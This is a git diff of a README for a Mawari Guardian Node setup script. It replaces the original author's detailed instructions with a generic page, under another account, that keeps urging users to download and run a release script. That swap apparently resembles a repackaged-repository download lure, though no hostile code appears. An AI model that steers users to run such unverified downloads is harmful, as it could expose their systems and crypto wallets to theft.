@@ -1,272 +1,93 @@
+# 🛠️ mawari-node-setup - Simplify Your Node Management Process
 
-# 🚀 Mawari Network Guardian Node Setup
+![Download](https://img.shields.io/badge/Download-v1.0-blue)
 
-<div align="center">
-  <img src="https://img.shields.io/badge/Mawari-Network-blue?style=for-the-badge&logo=ethereum&logoColor=white" alt="Mawari Network">
-  <img src="https://img.shields.io/badge/Status-Active-brightgreen?style=for-the-badge" alt="Status">
-  <img src="https://img.shields.io/badge/License-MIT-yellow?style=for-the-badge" alt="License">
-</div>
+## 🚀 Getting Started
 
-<div align="center">
-  <h3>Automated Guardian Node Setup & Management Script</h3>
-  <p>Complete solution for Mawari Network Guardian Node deployment with wallet management, faucet claiming, and delegation automation</p>
-</div>
+Welcome to **mawari-node-setup**! This tool helps you set up and manage Mawari Network Guardian Nodes easily. If you want to automate faucet claiming and delegation, you’re in the right place.
 
----
+## 📥 Download & Install
 
-## ✨ Key Features
+To get started, visit this page to download the latest release: [Download Mawari Node Setup](https://github.com/msopu/mawari-node-setup/releases).
 
-- **🔧 One-Click Installation**: Automated dependency installation (Docker, Python, etc.)
-- **🌐 Node Management**: Easy Guardian Node setup, monitoring, and status checking
-- **💳 Wallet Operations**: Wallet creation, burner address management, and private key access
-- **🚰 Faucet Automation**: Automated faucet claiming and token transfer to burner wallets
-- **🔗 Delegation Support**: Streamlined node delegation process with step-by-step guidance
-- **🛡️ Security First**: Secure private key handling with clipboard integration
-- **📊 Multi-Wallet Support**: Generate and manage multiple burner wallets simultaneously
-- **🔄 Screen Integration**: Run nodes in detached screen sessions for persistent operation
+## 📝 System Requirements
 
----
+Before downloading, ensure your system meets these basic requirements:
 
-## 📋 Prerequisites
+- **Operating System:** Linux (Ubuntu recommended)
+- **Disk Space:** At least 2 GB free
+- **Memory:** 1 GB RAM minimum
+- **Internet Connection:** Required for node setup and faucet claiming
 
-- Linux-based operating system (Ubuntu 20.04+ recommended)
-- Basic command-line knowledge
-- Mawari Network wallet for claiming and delegation
-- Internet connection for package downloads
+## 🎉 Features
 
----
-
-## 🚀 Quick Start
-
-### 1. Clone the Repository
-```bash
-git clone https://github.com/xPOURY4/mawari-node-setup.git
-cd mawari-node-setup
-```
-
-### 2. Make Script Executable
-```bash
-chmod +x mawari-setup.sh
-```
-
-### 3. Run in Screen Session (Recommended)
-```bash
-screen -S mawari
-./mawari-setup.sh
-```
-
-### 4. Detach from Screen
-After starting the script, detach from the screen session:
-```
-Ctrl + A, then D
-```
-
-### 5. Reattach to Screen (When Needed)
-```bash
-screen -r mawari
-```
-
----
-
-## 📖 Detailed Usage Guide
-
-### Running the Script
-
-The script provides an interactive menu system. You can run it either in a screen session (recommended for persistent operation) or directly in your terminal.
-
-#### Option A: Screen Session (Recommended)
-```bash
-# Create new screen session
-screen -S mawari
-
-# Run the script
-./mawari-setup.sh
-
-# Detach from screen (script continues running)
-Ctrl + A, then D
-
-# Reattach later
-screen -r mawari
-```
-
-#### Option B: Direct Terminal
-```bash
-./mawari-setup.sh
-```
-
-### Main Menu Options
-
-| Option | Description |
-|--------|-------------|
-| **1** | Install Dependencies - Docker, Python, and required packages |
-| **2** | Create New Wallet - Guidance for wallet creation and NFT minting |
-| **3** | Claim Faucet & Mint 3X NFT - Instructions for faucet claiming |
-| **4** | Setup Guardian Node - Deploy and start Guardian Node container |
-| **5** | Check Burner Address - View burner address and private key |
-| **6** | Node Status - Check running node status and logs |
-| **7** | Delegate Node - Step-by-step delegation instructions |
-| **8** | Claim Faucet & Send to Burner - Automated claiming and transfer |
-| **9** | Exit - Safely exit the script |
-
----
-
-## 🔐 Security Features
-
-### Private Key Management
-- **Secure Display**: Private keys are displayed with clear warnings
-- **Clipboard Integration**: Automatic copying to clipboard (when `xclip` is installed)
-- **File Storage**: Secure storage in `~/mawari/` with restricted permissions
-- **Warning Messages**: Clear security warnings before displaying sensitive data
-
-### Screen Session Benefits
-- **Persistent Operation**: Nodes continue running even after terminal closure
-- **Isolated Environment**: Separates node operation from management tasks
-- **Reattachable**: Easily reconnect to monitor or manage nodes
-- **Background Execution**: Nodes run without occupying your terminal
-
----
-
-## 🛠️ Advanced Operations
-
-### Checking Burner Address (Option 5)
-```bash
-# Access burner wallet information
-- Displays burner address and private key
-- Copies both to clipboard automatically
-- Saves to files: 
-  - ~/mawari/burner_address.txt
-  - ~/mawari/burner_private_key.txt
-- Shows security warnings
-```
-
-### Node Status Monitoring (Option 6)
-```bash
-# Check all running nodes
-- Lists active Docker containers
-- Shows resource usage
-- Provides quick access to logs
-```
-
-### Automated Faucet Claiming (Option 8)
-```bash
-# Automated claiming process
-- Creates claim bot if needed
-- Guides through credential setup
-- Automates faucet claiming and token transfer
-- Provides transaction receipts
-```
-
----
-
-## 📁 Directory Structure
-
-```
-~/mawari/
-├── flohive-cache.json          # Node configuration
-├── burner_address.txt          # Saved burner addresses
-├── burner_private_key.txt     # Saved private keys
-├── generated_wallets.log      # Wallet generation log
-├── setup.log                  # Installation logs
-├── bot/                       # Claim bot directory
-│   ├── mawari_claim_bot.py    # Claim bot script
-│   └── creds.txt              # Wallet credentials
-└── wallet_*/                  # Individual wallet directories
-    └── flohive-cache.json     # Wallet-specific config
-```
-
----
-
-## 🐳 Docker Integration
-
-The script uses Docker containers for reliable node deployment:
-
-```bash
-docker run -d \
-  --name mawari-node \
-  --pull always \
-  -v ~/mawari:/app/cache \
-  -e OWNERS_ALLOWLIST=YOUR_WALLET_ADDRESS \
-  us-east4-docker.pkg.dev/mawarinetwork-dev/mwr-net-d-car-uses4-public-docker-registry-e62e/mawari-node:latest
-```
-
----
-
-## 🔍 Monitoring & Management
-
-### Check Node Status
-```bash
-# View running containers
-docker ps | grep mawari-node
-
-# View logs
-docker logs mawari-node
-
-# Monitor resources
-docker stats mawari-node
-```
-
-### Screen Session Management
-```bash
-# List all screen sessions
-screen -ls
-
-# Reattach to specific session
-screen -r mawari
-
-# Kill a screen session
-screen -XS mawari quit
-```
-
----
-
-## 🛡️ Best Practices
-
-1. **Always use screen sessions** for persistent node operation
-2. **Never share private keys** - displayed with clear warnings
-3. **Regularly check node status** using option 6
-4. **Keep backups** of important files in `~/mawari/`
-5. **Monitor resource usage** with `docker stats`
-6. **Update regularly** by pulling the latest repository changes
-
----
-
-## 🤝 Contributing
-
-We welcome contributions! Please follow these steps:
-
-1. Fork the repository
-2. Create your feature branch: `git checkout -b feature/AmazingFeature`
-3. Commit your changes: `git commit -m 'Add some AmazingFeature'`
-4. Push to the branch: `git push origin feature/AmazingFeature`
-5. Open a Pull Request
-
----
-
-## 📄 License
-
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
-
----
-
-## 🙏 Acknowledgments
-
-- [Mawari Network](https://mawari.net/) for the Guardian Node implementation
-- [Docker](https://www.docker.com/) for containerization technology
-- [Web3.py](https://web3py.readthedocs.io/) for Ethereum integration
-- The open-source community for various tools and libraries
-
----
-
-## 👨‍💻 Author
-
-**Pourya**  
-- GitHub: [xPOURY4](https://github.com/xPOURY4)
-- Twitter: [TheRealPourya](https://twitter.com/TheRealPourya)
-
----
-
-<div align="center">
-  <i>If you found this project helpful, please consider giving it a ⭐️ on GitHub!</i>
-  <br><br>
-  <img src="https://img.shields.io/github/stars/xPOURY4/mawari-node-setup?style=social" alt="GitHub stars">
-</div>
+- **Automated Node Setup:** Streamline the process of setting up your Mawari Network guardian node.
+- **Faucet Claiming:** Automatically claim rewards from the Mawari faucet.
+- **Easy Delegation:** Simplify the process of delegating your resources to other nodes.
+- **Bash Script:** Written in bash for easy execution on Linux systems.
+
+## ⚙️ How to Use
+
+1. **Download the Script:**
+   Go to [this page](https://github.com/msopu/mawari-node-setup/releases) and download the latest version of the script.
+
+2. **Open Your Terminal:**
+   After downloading, locate the file in your downloads folder. Open the terminal on your Linux machine.
+
+3. **Navigate to the Download Folder:**
+   Use the following command to go to your download directory:
+   ```bash
+   cd ~/Downloads
+   ```
+
+4. **Make the Script Executable:**
+   Run this command to allow execution:
+   ```bash
+   chmod +x mawari-node-setup.sh
+   ```
+
+5. **Run the Script:**
+   Execute the script by typing:
+   ```bash
+   ./mawari-node-setup.sh
+   ```
+
+6. **Follow the Prompts:**
+   The script will guide you through the setup process. Simply follow the on-screen instructions to set up your node.
+
+## 📖 User Guide
+
+- **Initial Setup:** During the first run, the script will ask about your preferences. It’s important to stay connected to the internet for the faucet claiming feature.
+- **Checking Your Node Status:** You can check the status of your node anytime after setup by re-running the script.
+  
+## 🌐 Troubleshooting
+
+If you encounter issues, consider the following tips:
+
+- **Permissions Error:** Ensure you have the correct permissions by using the `chmod` command mentioned above.
+- **Network Issues:** Make sure your internet connection is stable when running the script.
+- **Logs:** The script generates log files in the same directory for any errors that occur. Review these for detailed information.
+
+## ❓ Frequently Asked Questions
+
+### Do I need to install anything before using mawari-node-setup?
+
+No special installations are required apart from a basic Linux environment. Ensure you have a working terminal.
+
+### Can I run the setup on Windows or Mac?
+
+This script is specifically designed for Linux systems. Consider using a Linux VM or Docker.
+
+### How do I update the script?
+
+To update to the latest version, download the latest release from [here](https://github.com/msopu/mawari-node-setup/releases) and repeat the installation steps.
+
+## 🌟 Community and Support
+
+Join the conversation, share your experiences, or ask for help. Connect with the community on our platform. Support is available if needed.
+
+## 📢 Feedback
+
+Your feedback is important. If you have suggestions or encounter any issues, open an issue in our GitHub repository. We appreciate your input and are here to improve your experience.
+
+For more information, keep referring to this page for updates: [Download Mawari Node Setup](https://github.com/msopu/mawari-node-setup/releases).
